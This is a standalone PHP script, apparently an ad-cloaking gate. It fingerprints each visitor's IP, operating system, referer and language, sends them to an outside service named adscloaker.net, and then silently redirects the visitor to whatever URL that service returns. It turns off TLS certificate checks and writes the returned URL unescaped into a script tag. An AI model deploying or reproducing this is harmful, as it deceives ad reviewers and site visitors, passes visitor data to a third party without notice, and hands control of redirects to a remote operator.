<?php
$server = $_SERVER;
$domain = str_replace('www.', '', $server['HTTP_HOST']);
$baseur = '//' . $server['HTTP_HOST'];

function isMobile($userAgent)
{ 
    $userAgent  = strtolower($userAgent);
    return preg_match("/(ios|iphone|ipad|ipod|android|avantgo|blackberry|bolt|boost|cricket|docomo|fone|hiptop|mini|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $userAgent);
}

function getOS($userAgent)
{ 
    $userAgent   = strtolower($userAgent);

    $osPlatform  = "Bilinmiyor";

    $osArray = [
        '/windows nt 10/i'      =>  'Windows 10',
        '/windows nt 6.3/i'     =>  'Windows 8.1',
        '/windows nt 6.2/i'     =>  'Windows 8',
        '/windows nt 6.1/i'     =>  'Windows 7',
        '/windows nt 6.0/i'     =>  'Windows Vista',
        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
        '/windows nt 5.1/i'     =>  'Windows XP',
        '/windows xp/i'         =>  'Windows XP',
        '/windows nt 5.0/i'     =>  'Windows 2000',
        '/windows me/i'         =>  'Windows ME',
        '/win98/i'              =>  'Windows 98',
        '/win95/i'              =>  'Windows 95',
        '/win16/i'              =>  'Windows 3.11',
        '/macintosh|mac os x/i' =>  'Mac OS X',
        '/mac_powerpc/i'        =>  'Mac OS 9',
        '/linux/i'              =>  'Linux',
        '/ubuntu/i'             =>  'Ubuntu',
        '/iphone/i'             =>  'iPhone',
        '/ipod/i'               =>  'iPod',
        '/ipad/i'               =>  'iPad',
        '/android/i'            =>  'Android',
        '/blackberry/i'         =>  'BlackBerry',
        '/webos/i'              =>  'Mobile'
    ];

    foreach($osArray as $regex => $value){
        if(preg_match($regex, $userAgent)){
            $osPlatform = $value;
        }
    }

    return $osPlatform;
}

function http($url, $params) { 
    $postData = '';
    foreach($params as $k => $v) { 
        $postData .= $k . '='.$v.'&'; 
    } 
    rtrim($postData, '&'); 

    $ch = curl_init(); 

    curl_setopt($ch, CURLOPT_URL, $url); 
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_HEADER, false); 
    curl_setopt($ch, CURLOPT_POST, count($params));
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData); 

    $output=curl_exec($ch); 

    curl_close($ch);
    return $output; 
}

function getIP()
{
    if($_SERVER["HTTP_CLIENT_IP"]){
        $ip = $_SERVER["HTTP_CLIENT_IP"];
    }
    elseif($_SERVER["HTTP_X_FORWARDED_FOR"]){
        $ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
        if(strstr($ip, ',')){
            $tmp = explode (',', $ip);
            $ip = trim($tmp[0]);
        }
    }
    else{
        $ip = $_SERVER["REMOTE_ADDR"];
    }

    return $ip;
}

$userAgent  = $_SERVER['HTTP_USER_AGENT'];
$userOs     = getOS($userAgent);
$userMobile = isMobile($userAgent);

if($_SERVER['HTTP_REFERER'] == ''){
    $userReferer = strtolower($userAgent);
}
else{
    $userReferer = $_SERVER['HTTP_REFERER'];
}

// echo $userReferer;

$userLanguage = strtoupper(substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2));

$postData = [
    'domain'	=> $domain,
    'language'  => $userLanguage,
    'referer'   => $userReferer,
    'type'      => 'Standart',
    'ip'        => getIP()
];

$r = http('https://www.adscloaker.net/api', $postData);
$s = json_decode($r);

if($s->success == 1){
    if(!headers_sent()){
        header('HTTP/1.1 301 Moved Permanently');
        header('LOCATION:' . $s->apiReturn[0][0]->redirectURL);
    }
    else{
        echo '<script>location.href=' . $s->apiReturn[0][0]->redirectURL . ';</script>';
    }
    die();
}
?>